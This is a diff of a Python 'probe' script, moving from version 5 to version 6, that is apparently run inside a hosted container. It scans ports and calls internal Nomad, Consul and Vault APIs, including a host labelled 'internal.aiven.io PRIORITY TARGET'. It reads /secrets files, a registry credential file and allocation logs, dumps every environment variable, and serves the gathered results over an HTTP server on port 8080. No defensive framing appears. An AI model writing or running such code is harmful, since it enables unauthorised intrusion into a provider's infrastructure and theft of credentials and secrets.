@@ -8,131 +8,86 @@ import subprocess
 
 results = {}
 
-def probe(name, url, timeout=5, headers=None):
-    try:
-        req = urllib.request.Request(url)
-        if headers:
-            for k, v in headers.items():
-                req.add_header(k, v)
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
-        data = resp.read().decode('utf-8', errors='replace')
-        results[name] = {"status": resp.status, "data": data[:4000], "headers": dict(resp.headers)}
-    except Exception as e:
-        results[name] = {"error": str(e)}
-
-def port_scan(name, host, ports, timeout=2):
-    open_ports = []
-    for port in ports:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(timeout)
-            result = s.connect_ex((host, port))
-            if result == 0:
-                open_ports.append(port)
-            s.close()
-        except:
-            pass
-    results[name] = {"open_ports": open_ports}
-
-def run_cmd(name, cmd, timeout=5):
+def run_cmd(name, cmd, timeout=10):
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
-        results[name] = {"stdout": r.stdout[:4000], "stderr": r.stderr[:500]}
+        results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
     except Exception as e:
         results[name] = {"error": str(e)}
 
-# 1. internal.aiven.io (35.244.221.102) - PRIORITY TARGET
-port_scan("internal_aiven_ports", "35.244.221.102",
-    [80, 443, 4646, 4647, 4648, 8080, 8443, 8500, 8200, 9090, 3000, 5000, 6443])
+def read_file(name, path, max_bytes=8000):
+    try:
+        with open(path, 'rb') as f:
+            data = f.read(max_bytes)
+            try:
+                results[name] = data.decode('utf-8')
+            except:
+                results[name] = data.hex()[:8000]
+    except Exception as e:
+        results[name] = str(e)
 
-# Try HTTP/HTTPS on internal.aiven.io
-for port in [80, 443, 8080, 8443]:
-    scheme = "https" if port in [443, 8443] else "http"
-    probe(f"internal_aiven_{port}", f"{scheme}://internal.aiven.io:{port}/")
-    probe(f"internal_aiven_{port}_v1", f"{scheme}://internal.aiven.io:{port}/v1/")
-    if port in [80, 8080]:
-        probe(f"internal_aiven_{port}_health", f"{scheme}://internal.aiven.io:{port}/health")
+# 1. NOMAD API ON HOST - Try various approaches
+# GET requests (Nomad API is typically GET for reads)
+run_cmd("nomad_get_agent", "curl -sk -m 5 http://169.254.1.2:4646/v1/agent/self 2>&1")
+run_cmd("nomad_get_agent_https", "curl -sk -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")
+run_cmd("nomad_get_jobs", "curl -sk -m 5 http://169.254.1.2:4646/v1/jobs 2>&1")
+run_cmd("nomad_get_allocs", "curl -sk -m 5 http://169.254.1.2:4646/v1/allocations 2>&1")
+run_cmd("nomad_get_nodes", "curl -sk -m 5 http://169.254.1.2:4646/v1/nodes 2>&1")
+run_cmd("nomad_get_status", "curl -sk -m 5 http://169.254.1.2:4646/v1/status/leader 2>&1")
+run_cmd("nomad_root", "curl -sk -m 5 -v http://169.254.1.2:4646/ 2>&1")
 
-# Direct IP access
-probe("internal_ip_80", "http://35.244.221.102:80/")
-probe("internal_ip_443", "https://35.244.221.102:443/")
+# Try with HTTP/1.0 and different methods
+run_cmd("nomad_http10", "curl -sk -m 5 --http1.0 http://169.254.1.2:4646/v1/agent/self 2>&1")
 
-# 2. Nomad endpoints (if accessible)
-for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102", "10.132.0.1"]:
-    for port in [4646]:
-        probe(f"nomad_{host.replace('.','_')}_{port}", f"http://{host}:{port}/v1/agent/self")
-        probe(f"nomad_{host.replace('.','_')}_{port}_jobs", f"http://{host}:{port}/v1/jobs")
-        probe(f"nomad_{host.replace('.','_')}_{port}_allocs", f"http://{host}:{port}/v1/allocations")
+# HTTPS with different TLS settings
+run_cmd("nomad_https_tls12", "curl -sk --tlsv1.2 -m 5 https://169.254.1.2:4646/v1/agent/self 2>&1")
 
-# 3. Consul endpoints (often paired with Nomad)
-for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102"]:
-    probe(f"consul_{host.replace('.','_')}_8500", f"http://{host}:8500/v1/agent/self")
+# 2. READ ALL ALLOCATION LOGS
+for logfile in ["pod.stderr.0", "pod.stdout.0", "sidecar.stdout.0", "sidecar.stderr.0",
+                "preflight.stderr.0", "preflight.stdout.0", "run.stderr.0", "run.stdout.0"]:
+    read_file(f"alloc_log_{logfile}", f"/alloc/logs/{logfile}")
 
-# 4. Vault endpoints
-for host in ["127.0.0.1", "169.254.1.2", "35.244.221.102"]:
-    probe(f"vault_{host.replace('.','_')}_8200", f"http://{host}:8200/v1/sys/health")
+# 3. List everything in /alloc
+run_cmd("alloc_tree", "find /alloc -type f 2>/dev/null | head -50")
+run_cmd("alloc_data", "ls -la /alloc/ 2>/dev/null && ls -la /alloc/data/ 2>/dev/null")
 
-# 5. Nomad allocation metadata - check env for Nomad vars
-results["nomad_env"] = {k:v for k,v in os.environ.items() if 'NOMAD' in k.upper()}
+# 4. Check /local directory (Nomad local dir)
+run_cmd("local_tree", "find /local -type f 2>/dev/null | head -50")
 
-# 6. Check Nomad token file
-for path in ['/secrets/nomad_token', '/secrets/.nomad_token', '/alloc/data', 
-             '/local', '/secrets', '/alloc']:
-    run_cmd(f"ls_{path.replace('/','_')}", f"ls -la {path} 2>/dev/null")
+# 5. Check .nomad-mount in detail (sometimes contains Nomad token)
+run_cmd("nomad_mount_hex", "xxd /secrets/.nomad-mount 2>&1 | head -5")
 
-# 7. Registry auth - if private repos are used, this contains docker creds
-run_cmd("registry_auth", "cat /secrets/registry-auth.env 2>&1")
+# 6. Try accessing Nomad with different port (HTTPS on 4646)
+run_cmd("nomad_4647", "curl -sk -m 5 http://169.254.1.2:4647/ 2>&1")
+run_cmd("nomad_4648", "curl -sk -m 5 http://169.254.1.2:4648/ 2>&1")
 
-# 8. .nomad-mount content
-run_cmd("nomad_mount", "cat /secrets/.nomad-mount 2>&1; stat /secrets/.nomad-mount 2>&1")
+# 7. Check all env vars including Nomad-related
+results["all_env"] = dict(os.environ)
 
-# 9. Check if there are ANY other env files or secrets
-run_cmd("all_secrets_deep", "find /secrets /run/secrets /var/run/secrets /alloc /local -type f 2>/dev/null | head -30")
+# 8. Check if NOMAD_TOKEN or NOMAD_ADDR is set anywhere
+run_cmd("find_nomad_ref", "grep -r 'NOMAD\|nomad' /secrets/ /alloc/ /local/ 2>/dev/null | head -20")
 
-# 10. Hosts file for internal references
-run_cmd("hosts", "cat /etc/hosts")
+# 9. Network check - what exactly is on 4646
+run_cmd("nc_nomad", "echo '' | nc -w 3 169.254.1.2 4646 2>&1 | head -c 500 || true")
 
-# 11. Try reaching the infrastructure nodes from /etc/hosts on their Nomad port
-ipv6_nodes = [
-    "fda7:a938:5bfe:5fa6:0:5ee:a62c:22a",  # 330
-    "fda7:a938:5bfe:5fa6:0:5ee:aa07:73b2",  # 336
-]
-for ip in ipv6_nodes:
-    for port in [4646, 4647, 8500, 8200]:
-        try:
-            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-            s.settimeout(2)
-            result = s.connect_ex((ip, port))
-            if result == 0:
-                results[f"infra6_{port}"] = "OPEN"
-            s.close()
-        except Exception as e:
-            pass
+# 10. Try Python urllib approach to Nomad 
+import urllib.request
+try:
+    req = urllib.request.Request("http://169.254.1.2:4646/v1/agent/self")
+    resp = urllib.request.urlopen(req, timeout=5)
+    results["nomad_python"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
+except Exception as e:
+    results["nomad_python"] = {"error": str(e)}
 
-# 12. curl internal.aiven.io with various paths
-run_cmd("curl_internal", """
-for path in / /v1/ /api/ /health /healthz /version /status /login /oauth /auth /metrics /admin /console; do
-    code=$(curl -s -o /dev/null -w '%{http_code}' -m 3 "http://internal.aiven.io$path" 2>/dev/null)
-    if [ "$code" != "000" ]; then
-        body=$(curl -s -m 3 "http://internal.aiven.io$path" 2>/dev/null | head -c 100)
-        echo "$path: $code $body"
-    fi
-done
-""")
-
-# 13. curl internal.aiven.io HTTPS
-run_cmd("curl_internal_https", """
-for path in / /v1/ /api/ /health /version; do
-    code=$(curl -sk -o /dev/null -w '%{http_code}' -m 3 "https://internal.aiven.io$path" 2>/dev/null)
-    if [ "$code" != "000" ]; then
-        body=$(curl -sk -m 3 "https://internal.aiven.io$path" 2>/dev/null | head -c 200)
-        echo "$path: $code $body"
-    fi
-done
-""")
+try:
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    req = urllib.request.Request("https://169.254.1.2:4646/v1/agent/self")
+    resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+    results["nomad_python_https"] = {"status": resp.status, "data": resp.read().decode()[:4000], "headers": dict(resp.headers)}
+except Exception as e:
+    results["nomad_python_https"] = {"error": str(e)}
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -143,5 +98,5 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *args):
         pass
 
-print("Starting probe v5 on port 8080...")
+print("Starting probe v6 on port 8080...")
 http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
